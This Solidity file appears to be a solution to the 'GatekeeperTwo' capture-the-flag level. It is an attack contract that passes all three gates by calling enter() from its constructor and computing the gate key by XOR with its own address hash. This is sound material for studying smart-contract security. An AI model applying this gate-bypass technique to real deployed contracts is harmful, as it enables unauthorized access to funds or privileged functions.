// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./GatekeeperTwo.sol";

import "hardhat/console.sol";

// 👉 Gate 1
contract HackGatekeeperTwo {
    // uint64 private MAX64 = uint64(0) - 1;

    // 👉 Gate 2
    constructor(address gateKeeperTwoAddress) payable {
        // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/3dac7bbed7b4c0dbf504180c33e8ed8e350b93eb/contracts/utils/Address.sol#L6
        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(
            payable(gateKeeperTwoAddress)
        );

        uint64 maxUint64;
        unchecked {
            maxUint64 = uint64(0) - 1;
        }
        // 1111111111111111111111111111111111111111111111111111111111111111
        console.log("> maxUint64: ", maxUint64);
        console.log("> maxUint64 (bytes8): ");
        console.logBytes8(bytes8(maxUint64));

        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^
            bytes8(maxUint64); // 👉 Gate 3

        console.log("> GateKey: ");
        console.logBytes8(gateKey);

        gatekeeperTwo.enter(gateKey);
    }
}
